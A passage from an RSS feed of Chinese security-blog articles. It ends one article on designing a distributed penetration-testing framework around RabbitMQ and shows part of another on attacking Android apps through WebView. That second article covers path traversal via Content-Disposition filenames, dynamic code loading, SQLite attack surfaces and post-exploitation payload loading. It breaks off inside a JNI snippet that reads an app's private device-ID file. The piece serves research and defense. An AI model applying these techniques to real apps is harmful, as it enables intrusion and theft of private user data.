;&lt;li&gt;框架扩展系统&lt;/li&gt;&lt;ol&gt;&lt;li&gt;任务脚本 SDK&lt;/li&gt;&lt;li&gt;关键点／关键消息队列拓展&lt;/li&gt;&lt;/ol&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;设计&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;根据我们需求，最简单的，我们整体的架构应该是一个松散的 Master-Slave 架构，Master 并不依赖任何 Slave，但是 Slave 必须依附于 Master 才可以工作。&lt;/p&gt;&lt;p&gt;在进行下面的叙述过程中，我们首先约定一下在我们的框架中要出现的几个概念：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Master - 主控实体&lt;/li&gt;&lt;li&gt;MQ 连接 Master 与 Slave 所有服务通信的中间件&lt;/li&gt;&lt;li&gt;Slave - 具体执行业务的实体&lt;/li&gt;&lt;ul&gt;&lt;li&gt;功能单元：具备一种执行任务的能力，但是只能执行一种，可以直接向 Master 汇报生存状况和结果，脱离节点也可以存在&lt;/li&gt;&lt;li&gt;节点：可以管理多个功能单元，但是不实现执行任务的接口，也并没有执行任务的能力，可以直接向 Master 汇报生存状况和结果（结果来源于功能单元）&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;p&gt;好的，我们用下面这个图来简单说明一下结构&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-81d9fb3e1c608427fe039f5593543493_r.jpg&quot; data-rawwidth=&quot;2043&quot; data-rawheight=&quot;2149&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;同时，这个整体的架构并不够我们描述整个框架，也显得非常敷衍，所以我们很有必要做详细的阐述：&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Master 拆分服务与子功能&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Master 是一个巨大的功能集合，但是并不是一个“牛类”这样的东西，Master 是由很多个服务构成的，因此我们非常有必要把 Master 拆分成具体的服务来分别阐述其用途。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;通信服务&lt;/li&gt;&lt;li&gt;节点和模块管理服务：提供对 Slave 的管理功能&lt;/li&gt;&lt;ul&gt;&lt;li&gt;节点管理子服务&lt;/li&gt;&lt;li&gt;模块（功能单元）管理子服务&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;模块调度服务：调度模块／功能单元之间的协作逻辑&lt;/li&gt;&lt;li&gt;事务处理服务&lt;/li&gt;&lt;ul&gt;&lt;li&gt;任务处理子服务&lt;/li&gt;&lt;li&gt;结果处理子服务&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;持久化服务：存储任务和结果&lt;/li&gt;&lt;li&gt;用户服务&lt;/li&gt;&lt;ul&gt;&lt;li&gt;用户鉴权与管理（后期）&lt;/li&gt;&lt;li&gt;用户接口&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-3db80851b08aec077b2bbae03bfde28e_r.png&quot; data-rawwidth=&quot;1137&quot; data-rawheight=&quot;386&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Slave 拆分服务与子功能&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;节点服务&lt;/li&gt;&lt;ul&gt;&lt;li&gt;Master 通信服务&lt;/li&gt;&lt;ul&gt;&lt;li&gt;控制信道：传递主控节点的控制信息&lt;/li&gt;&lt;li&gt;任务信道：任务接收信道&lt;/li&gt;&lt;li&gt;结果信道：结果汇报&lt;/li&gt;&lt;li&gt;汇报信道：额外信息汇报&lt;/li&gt;&lt;li&gt;…...&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;功能单元管理子服务&lt;/li&gt;&lt;li&gt;功能单元使用子服务&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;功能单元服务&lt;/li&gt;&lt;ul&gt;&lt;li&gt;接收任务&lt;/li&gt;&lt;li&gt;检查参数与合理性&lt;/li&gt;&lt;li&gt;执行任务&lt;/li&gt;&lt;li&gt;返回最终结果或者阶段性结果&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b024368c6c0474605a9cb5830deda05d_r.png&quot; data-rawwidth=&quot;544&quot; data-rawheight=&quot;403&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;其他设备&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;消息队列（集群）：在下一个 Topic 会着重探讨。&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;过程设计&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;设计对应需求，我们仍然需要对重要的过程进行设计，和上面服务／功能拆分是不同的角度，但是也很好的可以描述出框架工作的过程。所以我个人觉的这个角度来做一些说明是非常有必要的。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;事务处理流程&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;事务处理不论是在各种门户的微服务架构中还是在电商微服务架构都起着非常重要的作用：&lt;/p&gt;&lt;p&gt;事务的存在是为了保障任务执行的完整性和精确性，举个例子说明事务的存在的必要：当你的事情开始执行了，但是由于节点崩溃或者网络原因，没有办法成功执行这个操作，在收到执行失败的信号之后，事务会回滚到上一个安全的状态，这样就避免了 Pending 这种薛定谔状态，也是最终一致性的一种体现或者实现方法吧（当然事务控制中心我们这里只设置一个，就不存在多个事物控制中心数据的需要强同步的问题了）&lt;/p&gt;&lt;p&gt;我们在设计这个框架的时候有意将事务这个概念引入我们的框架，运用最终一致性处理事务处理&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-f98323bfcc214ecf1f87e9cebc52dd6c_r.jpg&quot; data-rawwidth=&quot;2087&quot; data-rawheight=&quot;2888&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;功能单元生存周期&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当然理应所有的功能实体都应该有一个状态机，但是由于篇幅所限，我们就举个简单的例子，功能单元的生存周期状态图如下&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-03f710d46c578d1afe8ae37734ac28ba_r.jpg&quot; data-rawwidth=&quot;1570&quot; data-rawheight=&quot;660&quot;&gt;&lt;p&gt;在功能单元启动之后，首先进入初始状态，进行初始化，初始化成功则进入 Prepared 状态，如果初始化失败，造成功能单元崩溃，则进入崩溃处理流程。&lt;/p&gt;&lt;p&gt;在 Prepared 状态下，功能单元自动发起注册到 Master，如果注册成功，改变状态为 Registered，如果失败，进入 Unregistered 状态。&lt;/p&gt;&lt;p&gt;Registered 状态直接进入 Working 状态，Working 状态下，会定时发送心跳（或者其他机制来保证与 Master）连接，如果发生多次连接断开，则进入 Unregistered 状态。同时在 Working 状态下进行事务处理（略）。如果事务处理过程中程序遭遇到不可解决的崩溃，则进入 Crashed 状态。&lt;/p&gt;&lt;p&gt;Crashed 状态下，我们需要重置功能单元决定是停止功能单元，还是重启。&lt;/p&gt;&lt;p&gt;Unregistered 状态会自动关闭功能单元，因为 Unregistered 是一个标志着功能单元正常结束的单元。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在上一个话题中，我们关于消息队列（通信）的部分并没有做太多的描述，接下来我们就在下一个话题中具体阐述一下关于节点通信的问题。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Topic - 通信与消息队列&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;本部分与大家简单探讨本框架的架构与消息队列的关系和对消息队列的设计。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;消息队列基础&lt;/b&gt;&lt;/h2&gt;&lt;blockquote&gt;参考资料：&lt;a href=&quot;https://tech.meituan.com/mq-design.html&quot;&gt;https://tech.meituan.com/mq-design.html&lt;/a&gt;&lt;br&gt;RabbitMQ: &lt;a href=&quot;https://www.rabbitmq.com/reliability.html&quot;&gt;https://www.rabbitmq.com/reliability.html&lt;/a&gt;&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;必要性&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;对于我们的渗透测试系统，消息队列真的是必须的么？我个人的回答是必须的。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;主要特性：解决服务（模块）通信问题&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;通信不仅仅是 “我发送，你收到” 这么简单的事情。从本文框架的架构整体上来说，是一个 &lt;b&gt;Master / Slaves&lt;/b&gt; 的架构模式，也就是说一个 Master 和多个 Slaves 同时进行通信，当然通信的种类也多种多样：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;任务分发通信（多对多）：Master 向 Slaves 分发任务，这个通信模型更像是一个 &lt;b&gt;Producer / Consumer&lt;/b&gt; 的模式，这很好理解，Master 发送任务，Slaves 执行，我们自然保证并不想多个 Slave 同时来做一个任务，这样就白白浪费了资源。&lt;/li&gt;&lt;li&gt;通知与订阅消息通信（一对多）：可以简单想象一下广播与组播的需求，这种通信模型我们可以暂且称之为 &lt;b&gt;FanOut&lt;/b&gt; 吧。其实这也非常好理解，当你的 Master 想要发送一个通知消息，这个消息可能是针对全体的 Slaves 的，这样最合适的办法就是使用广播通信模式；同样的，当你的 Master 想要针对某一个组发送通知（例如关闭所有的爬虫模块组，升级某一个组的数据库，或者更新代码，部署新的功能），这类通知你是不希望被其他无关组或者无关节点收到的。针对这些情况，FanOut 可以很好解决。&lt;/li&gt;&lt;li&gt;点对点（一对一）：这里主要不涉及 Slave 与 Slave 的通信，我们的架构似乎并不喜欢 Slave 与 Slave 之间有联系，这样会极大增加耦合度和复杂度；但是 Master 到 Slave 的单点通信时必须要有的，因为我们经常会需要单独告诉一个 Slave 应该干啥（关闭 Slave，重启 Slave 甚至 升级 Slave）&lt;/li&gt;&lt;li&gt;结果汇报与生存状况汇报（多对多）：作为无状态的 Slave，完成一个任务的第一件事，应该就是把任务传回 Master；当然，作为 Master，是有必要知道 Slave 的一些生存状况的，除了主动问询的方法之外，Slave 还应该主动向 Master 进行汇报；同时，Slave 的关键部分挂掉了，错误信息／日志，也应该传回 Master…… 这样的需求其实一点都不过分，我们需要一个 &lt;b&gt;FanIn&lt;/b&gt; 的模型去解决这种问题。&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;次要特性：可靠性／安全性&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;可靠性：在正常工作的条件下，你的通信两端拿到的数据是无差别的不会出现数据的差别，并且不会无故丢失数据，出现不期望的数据。你可以信赖你的数据来源。&lt;/li&gt;&lt;li&gt;安全性：不希望数据被别人截取造成信息泄漏，或者因为反序列化漏洞造成 RCE，或者命令注入，或者未知的风险，通信需要支持 SSL &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;而一个可靠的消息队列，它本身会有一整套的机制保证消息从一端到另外一端是可靠的，你可以不必担心你的消息在通信的过程中丢失／在消息队列中丢失（因为机器重启或其他不可预料的因素）。我们以 RabbitMQ 做例子，举例一下 RabbitMQ 在数据可靠性和一致性上做的一些工作：&lt;/p&gt;&lt;blockquote&gt;&lt;b&gt;Ensuring Messages are Routed&lt;/b&gt;&lt;br&gt;In some circumstances it can be important for producers to ensure that their messages are being routed to queues (although not always - in the case of a pub-sub system producers will just publish and if no consumers are interested it is correct for messages to be dropped).&lt;br&gt;确保消息一定是被路由处理的：在绝大多数情况下，RabbitMQ 都可以让生产者确认消息通过路由已经被传递进了消息队列中（除了没有订阅者的 &lt;b&gt;发布-订阅&lt;/b&gt; 系统）&lt;br&gt;&lt;br&gt;&lt;b&gt;At the Consumer&lt;/b&gt;&lt;br&gt;In the event of network failure (or a node crashing), messages can be duplicated, and consumers must be prepared to handle them. If possible, the simplest way to handle this is to ensure that your consumers handle messages in an idempotent way rather than explicitly deal with deduplication.&lt;br&gt;在节点崩溃或者网络错误的时候，消息可能会出现重复，与此同时消费者必须对重复有解决办法。如果想解决这个问题，最简单的方法就是使用幂等这种方法（而不是直接处理）。&lt;br&gt;&lt;br&gt;If a message is delivered to a consumer and then requeued (because it was not acknowledged before the consumer connection dropped, for example) then RabbitMQ will set the redeliveredflag on it when it is delivered again (whether to the same consumer or a different one).&lt;br&gt;... &lt;br&gt;Conversely if the redelivered flag is not set then it is guaranteed that the message has not been seen before. Therefore if a consumer finds it more expensive to deduplicate messages or process them in an idempotent manner, it can do this only for messages with the redeliveredflag set.&lt;br&gt;如果一个已经被送到了接收方，但是因为没有 ACK，消息会被重新进入消息队列；但是如果你想让消息再回到这个没有 ACK 的接受方，你需要向让你的消息设置一个 &lt;b&gt;Redeliveredflag&lt;/b&gt;，如果这样的话，你的接收方会重新接受到那个没有 ACK 的信息。&lt;br&gt;…&lt;br&gt;反过来说如果 redelivered flag 没有被设置的话，就可以确保你接收方都不会受到重复的消息了。因此吧，我们其实并不是必须在应用业务层进行幂等方法，可以简单的使用消息队列的这个特性。&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;选型（可编程的协议 - RabbitMQ）&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们在这里选择 RabbitMQ 作为我们消息队列支持，接下来结合 RabbitMQ 的特征和我们的框架特性，我们可以尝试简单设计一下关键的消息队列结构。其实对于我们的 RabbitMQ 来说，消息队列的设计也会相当愉快，我们的发送方其实是不知道接收方具体的消息队列的，消息队列其实只是一个存在于接收方的概念。在发送方，只有交换机和路由的概念。所以我们可以使用不同交换机的种类配合路由来实现。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;交换机&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在 RabbitMQ 中，交换机有四种类型：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Direct Exchange（直连交换机）：由 routing_key 提供一对一的直连服务，这样就可以解决 Master 到单个节点或者功能单元的问题。&lt;/li&gt;&lt;li&gt;Fanout Exchange（扇出交换机） ：提供一（一个交换机）对多的消息交换服务，可以解决 Master 到所有节点的通知问题，但是这个需求实际上并不是特别的必要（除了整个系统在进行大的升级／关闭的时候），并不是非常常用。&lt;/li&gt;&lt;li&gt;Topic Exchange（主题交换机） ：这个其实也可以说是和 Fanout Exchange 有一点类似，只要订阅了一个主题就可以收到这个主题的相关信息了，当然订阅主题的方法也十分灵活。我们可以通过这个交换机，向各个组／ 类型／具有某个预设特征的功能单元或者节点发送消息。&lt;/li&gt;&lt;li&gt;Header Exchange（首部交换机） ： Direct Exchange 的另外一种表现形式，只是不是使用 routing_key 进行路由的，是由本身的一个 headers 来控制的。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;根据这四种类型的交换机，我们很容易设计出我们的通信系统。（当实际的使用，我们并不会全部选择）&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-2302768d687ada1e47bb8424401f393a_r.jpg&quot; data-rawwidth=&quot;1744&quot; data-rawheight=&quot;1286&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;下面依次对几个交换机做简要说明：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;任务分发交换机（ Direct Exchange ），每一种类型的任务是一个路由键，节点需设置这个路由键才能收到任务。在客户端，每一类型的功能单元要设置相同的路由键（类型名），才可以接收到任务&lt;/li&gt;&lt;li&gt;结果收集交换机（ Topic Exchange ），日志记录系统和审计系统或者其他系统都可以通过这个结果收集交换机订阅到自己想要查看的结果。同样，如果开发新的服务或者模组也可以通过订阅结果交换机去获取任务执行的结果。&lt;/li&gt;&lt;li&gt;控制交换机（ Direct Exchange ），直接管理节点的行为（启动／停止／更新），当然这个控制交换机的路由键为这个节点的 GUID 或 UUID，这样可以实现 Master 到 Slave 的单点链接。&lt;/li&gt;&lt;li&gt;通知交换机（ Topic Exchange ），按功能单元的类型分组，控制交换机的批量操作（对某一种类型的功能单元进行更新数据库，热补丁／批量关闭）。&lt;/li&gt;&lt;li&gt;反馈交换机（ Topic Exchange ），同结果交换机。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;其中，任务分发和结果收集是属于事务（任务）管理服务的，控制／通知／反馈交换机是属于节点（功能单元）管理服务的。这样我们可以把管理与业务，通过消息队列进行完美分离。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;上文描述了一个分布式渗透框架该有的部分，但是限于篇幅，我们没有办法把每一个部分都的设计思路都描述清楚。笔者能力有限，文中如有纰漏，希望读者不吝赐教。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;PS: 知乎的编辑器莫名其妙粒子态吃掉列表的 Tab 导致列表出现格式 Bug，笔者经过尝试无法修好 😢&lt;/p&gt;</description>
<author>v1ll4n</author>
<guid isPermaLink="false">2017-08-25-28781870</guid>
<pubDate>Fri, 25 Aug 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>通过 WebView 攻击 Android 应用</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-07-26-28107901.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;通过 WebView 攻击 Android 应用&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28107901&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-be9ee8b4483f67962aecb8f34a82ed65_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;WebView 可在应用中嵌入一个内置的 Web 浏览器，是 Android 应用开发常用的组件之一。通过 WebView 对 Android 应用的攻击案例屡见不鲜，比如几年前就被玩坏的 addJavascriptInterface 远程代码执行。但修复了 addJavascriptInterface 并不表示就能高枕无忧。应用在 WebView 上为 Javascript 提供的扩展接口，可能因为接口本身的问题而变成安全漏洞。&lt;/p&gt;&lt;p&gt;除此之外，在没有启用进程隔离的 WebView 与 App 具有相同权限，获得任意代码执行后可以访问应用私有数据或其他系统接口，可以将浏览器漏洞移植到手机平台上对应用进行针对性攻击。部分厂商使用自行基于开源浏览器引擎 fork 而来的内核，也可能因为同步上游补丁代码不及时而出现可利用的漏洞。&lt;/p&gt;&lt;p&gt;在 Android N 中增加了一个开发者选项，就是在所有的应用中将 WebView 的渲染进程运行在独立的沙箱中。即使恶意网页通过漏洞在渲染进程中执行了代码，还需要更多的漏洞绕过沙箱的限制。这一特性将&lt;a href=&quot;https://developer.android.com/preview/behavior-changes.html#security-all&quot;&gt;在 Android O 中默认启用&lt;/a&gt;。但在这一缓解措施正式部署到大部分设备之前，通过攻击 WebView 获得远程代码执行进而直接攻击应用仍然是可行的。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-51e68d06636afabcdb96e97fcc7aa8ca_r.png&quot; data-rawwidth=&quot;1440&quot; data-rawheight=&quot;1144&quot;&gt;&lt;h2&gt;Beyond addJavascriptInterface&lt;/h2&gt;&lt;p&gt;本文并不打算炒 addJavascriptInterface 的冷饭，而是关注在接口本身的实现上。&lt;/p&gt;&lt;p&gt;即使是使用了相对安全的通信手段（如 shouldOverrideUrlLoading 或 onJsAlert 之类回调的方案，或是其他基于类似方案的开源通信库），如果应用接口设计不当，仍然存在被恶意页面通过 js 执行任意代码的可能。&lt;/p&gt;&lt;p&gt;&lt;b&gt;利用可写入的可执行文件&lt;/b&gt;&lt;/p&gt;&lt;p&gt;这一种攻击方式需要结合两种类型的漏洞，一是能在本地写入路径和内容可控的文件，二是应用中存在动态加载不可信代码的逻辑。逻辑漏洞不涉及内存破坏，利用起来非常稳定。另外此类漏洞调用逻辑相对复杂，可能较难通过完全自动化的方式扫描识别。&lt;/p&gt;&lt;p&gt;在 Android 中因为开发者不严谨造成任意文件写入的漏洞较为常见。首先是写文件的接口可能本身设计上就允许传入任意路径的参数，另一种情况就是直接拼接路径导致可以 “…/” 进行目录穿越。&lt;/p&gt;&lt;p&gt;常见的场景有：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;下载远程文件到指定的路径&lt;/li&gt;&lt;li&gt;解压 zip 文件时未对 ZipEntry 文件名进行合法性检查，可路径穿越&lt;/li&gt;&lt;li&gt;下载时未对 Content-Disposition: 进行合法性检查，可路径穿越&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;最后一个点比较少人注意到。&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition&quot;&gt;Content Disposition&lt;/a&gt; 是常见的 HTTP 协议 header，在文件下载时可以告诉客户端浏览器下载的文件名。例如服务器返回 Content-Disposition: attachment; filename=&quot;cool.html&quot; ，浏览器将弹出另存为对话框（或直接保存），默认的文件名就是 cool.html。&lt;/p&gt;&lt;p&gt;但这个 filename 参数显然是不可信任的。例如恶意网站返回的文件名包含 ../，当 Android 应用尝试将这个文件保存到 /sdcard/Downloads 时，攻击者就有机会把文件写入到 /data/ 目录中了：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-0679c320602b350418637272d477a53c_r.png&quot; data-rawwidth=&quot;1440&quot; data-rawheight=&quot;902&quot;&gt;&lt;p&gt;如果用户不小心点击确认下载，文件将会被写入到指定的位置。这种攻击甚至完全不需要 WebView 允许执行 Javascript（setJavaScriptEnabled(true)），只要简单在 HTTP 服务器中添加一个恶意 header 即可实现。&lt;/p&gt;&lt;p&gt;在写入文件后便是代码的加载。几种常见的 Android 下动态加载可执行代码的方式：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;DexClassLoader 动态载入应用可写入的 dex 可执行文件&lt;/li&gt;&lt;li&gt;java.lang.Runtime.exec 方法执行应用可写入的 elf 文件&lt;/li&gt;&lt;li&gt;System.load 和 System.loadLibrary 动态载入应用可写入的 elf 共享对象&lt;/li&gt;&lt;li&gt;本地代码使用 system、popen 等类似函数执行应用可写入的 elf 文件&lt;/li&gt;&lt;li&gt;本地代码使用 dlopen 载入应用可写入的 elf 共享对象&lt;/li&gt;&lt;li&gt;利用 Multidex 机制：&lt;a href=&quot;https://www.nowsecure.com/blog/2015/06/15/a-pattern-for-remote-code-execution-using-arbitrary-file-writes-and-multidex-applications/&quot;&gt;A Pattern for Remote Code Execution using Arbitrary File Writes and MultiDex Applications&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;如果应用动态加载代码之前未做签名校验，利用存在任意文件写入问题的 WebView 扩展接口进行覆盖，可实现稳定的任意代码执行。此外由于在文件系统中写入了可执行文件，还可以实现持久化攻击的效果。&lt;/p&gt;&lt;p&gt;&lt;b&gt;SQLite 接口&lt;/b&gt;&lt;/p&gt;&lt;p&gt;部分应用为 WebView 提供了可执行任意 SQL 语句的扩展接口，允许打开和查询文件名可控的数据库；除此之外，在 WebKit 中有一个比较少用的 WebDatabase 功能，已被 W3C 标准废弃，但 WebKit 和 Chromium 仍然保留了实现。SQLite3 中存在一些已知的攻击面（如 load_extension 和 fts3_tokenizer 等），因此浏览器的 WebSQL 对 SQL 中可查询的函数做了白名单限制。&lt;/p&gt;&lt;p&gt;但长亭安全实验室发现，即使是浏览器白名单中的 SQLite3 函数依然存在可利用的安全性问题，最终可实现一套利用在 Chrome 和 Safari 两大浏览器上通用的代码执行。此漏洞被用于 2017 年 Pwn2Own 黑客大赛上攻击 Safari 浏览器。&lt;b&gt;此漏洞影响所有支持 WebDatabase 的浏览器（Windows、Linux、macOS、iOS、Android 上的 Chrome、Safari），包括多个 App 厂商基于 blink 或 WebKit 分支开发的浏览器引擎，影响数量非常可观。&lt;/b&gt;漏洞目前已被 SQLite 和相关浏览器引擎修复。关于漏洞利用细节，长亭安全实验室将在 BlackHat 大会上进行详细讲解：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.blackhat.com/us-17/briefings/schedule/index.html#many-birds-one-stone-exploiting-a-single-sqlite-vulnerability-across-multiple-software-7024&quot;&gt;https://www.blackhat.com/us-17/briefings/schedule/index.html#many-birds-one-stone-exploiting-a-single-sqlite-vulnerability-across-multiple-software-7024&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-da02b6f502423f9df84571d9dcc86248_r.png&quot; data-rawwidth=&quot;1031&quot; data-rawheight=&quot;475&quot;&gt;&lt;p&gt;即使是做了权限限制的 WebDatabase 依然会出现问题，而我们不时可以看到一些应用直接将 SQLite 查询接口不做任何限制就暴露给了 WebView。这意味着使用之前已知的攻击方式（fts3_tokenizer、load_extension、attach 外部数据库等）将可以结合脚本的能力得到充分利用。&lt;/p&gt;&lt;p&gt;一些应用允许通过参数打开指定文件名，实现上存在任意路径拼接的漏洞。恶意页面可以打开任意 App 沙盒目录下任意数据库进行查询，将私有数据完全暴露给攻击者。&lt;/p&gt;&lt;p&gt;为了安全以及实际开发工程量考虑，我们建议在开发混合应用时，如需为 HTML5 应用提供离线存储能力，可直接使用 localStorage、IndexedDB 等 API。&lt;/p&gt;&lt;p&gt;&lt;b&gt;其他可通过扩展接口触发的问题&lt;/b&gt;&lt;/p&gt;&lt;p&gt;扩展接口在增强了 Web 内容的表现力的同时，也为应用增大了攻击面。一些需要本地才能触发的问题，如 Intent、ContentProvider 等，可以通过扩展接口提供的便利得以远程利用。&lt;/p&gt;&lt;p&gt;例如，使用 js 唤起 Activity 是很常见的功能；开启 setAllowContentAccess 后 WebView 可以通过 content:// 访问 ContentProvider，甚至扩展接口本身提供了这样的能力……这些原本需要本地安装恶意应用，需要导出 Activity、ContentProvider 才能触发的问题，可以被远程调用了。&lt;/p&gt;&lt;p&gt;应用本身的实现也有可能存在命令注入、允许 js 访问反射等安全问题。比如这篇文章介绍了某 Android 上的浏览器 App，存在任意文件写入、SQL 注入、XSS 等问题，最终可以跨域获取用户信息、远程执行代码：&lt;a href=&quot;http://d3adend.org/blog/?p=851&quot;&gt;http://d3adend.org/blog/?p=851&lt;/a&gt;&lt;/p&gt;&lt;p&gt;应用开发者在做接口的时候，不仅需要小心避免代码本身的安全漏洞，在 js 调用者的域上做好限制。&lt;/p&gt;&lt;h2&gt;从 shellcode 到攻击载荷&lt;/h2&gt;&lt;p&gt;由于目前（&amp;lt; Android O）默认没有启用隔离进程的 WebView，将浏览器引擎的漏洞移植到 Android 平台来攻击带 WebView 的应用。多数浏览器引擎漏洞利用会最终执行一段 shellcode。不过仅仅反弹一个 shell 显然不足以实现攻击 App，还要有针对性地调用一些 Android 虚拟机运行时的特性。&lt;/p&gt;&lt;p&gt;例如通过 App 权限读取短信、联系人，或者需要解密应用自身使用的某个 SQLite 数据库的内容，就需要使用 JNI 实现相应的逻辑。&lt;/p&gt;&lt;p&gt;&lt;b&gt;载荷的载入&lt;/b&gt;&lt;/p&gt;&lt;p&gt;就攻击特定应用的场景而言，将载荷完全使用 shellcode 甚至 ROP 并非不可能，但或多或少增加工作量。有一个 shell 之后可以做什么？很容易想到下载一个可执行文件然后加载。Android 没有自带 wget 或 curl，除非用户自行 root 并安装 busybox。不过有 xxd 命令可以使用，使用 echo 和管道重定向的方式还是可以实现下载可执行文件的。&lt;/p&gt;&lt;p&gt;如果不想在文件系统留下痕迹，手工模拟动态链接、重定位 ELF，可在内存中直接加载可执行文件。BadKernel 是一个利用了 V8 上游已经修补，但未及时同步到第三方 fork 中的漏洞，攻击某知名即时聊天应用的案例。在 &lt;a href=&quot;https://github.com/secmob/BadKernel/blob/master/exploit.html#L282&quot;&gt;BadKernel 的利用代码&lt;/a&gt; 中，调用 JNI 查询 ContentProvider 获取短信的逻辑是单独编译到一个 so 中的。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-26127902353e28f2005f0593cbd237d2_r.png&quot; data-rawwidth=&quot;1071&quot; data-rawheight=&quot;689&quot;&gt;&lt;p&gt;在作者公开的利用代码中，首先通过 javascript 任意地址读写，搜索一行调用 dlsym 的机器码，从中解析出 dlopen@plt 的地址，再加上三条指令的长度获得 dlsym@plt 的地址。触发任意代码执行时将这两个函数指针传入 shellcode，以进一步解析所需的各种符号。最后进入 shellcode 中实现的简化版 linker，直接将 ELF 文件内容放在 RWX 内存中重定位处理后，执行其 so_main 导出函数。&lt;/p&gt;&lt;p&gt;&lt;b&gt;JNI 基础&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Android 中 JVM 和 C/C++ 开发的本地代码互相调用，可以使用 JNI（Java Native Interface）。在 System.loadLibrary 载入一个动态链接库之后，JVM 会调用 ELF 中导出的 JNI_OnLoad(JavaVM *jvm, void *reserved) 函数，在这里可以做一些初始化的工作，以及使用 JNIEnv 的 RegisterNatives 方法动态将 Java 方法与本地代码绑定。&lt;/p&gt;&lt;p&gt;本地代码为 JNI 提供的方法的第一个参数是 JNIEnv 的指针，通过这个上下文可以访问 JVM 当前加载的类，通过反射机制调用 Java 层的功能。例如如下 Java 代码：&lt;/p&gt;&lt;code lang=&quot;java&quot;&gt;ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;MicroMsg/CompatibleInfo.cfg&quot;));
HashMap&amp;lt;Integer, String&amp;gt; hashMap = (HashMap&amp;lt;Integer, String&amp;gt;)ois.readObject();
String deviceId = hashMap.get(Integer.valueOf(258));
&lt;/code&gt;&lt;p&gt;使用 JNI 实现如下：&lt;/p&gt;&lt;code lang=&quot;cpp&quot;&gt;char *id = (char*)malloc(64);
jstring filename = (*env)-&amp;gt;NewStringUTF(env, &quot;MicroMsg/CompatibleInfo.cfg&quot;);
jclass clsFileInputStream = (*env)-&amp;gt;FindClass(env, &quot;java/io/FileInputStream&quot;);
jclass clsObjectInputStream = (*env)-&amp;gt;FindClass(env, &quot;java/io/ObjectInputStream&quot;);
jclass clsHashMap = (*env)-&amp;gt;FindClass(env, &quot;java/util/HashMap&quot;);

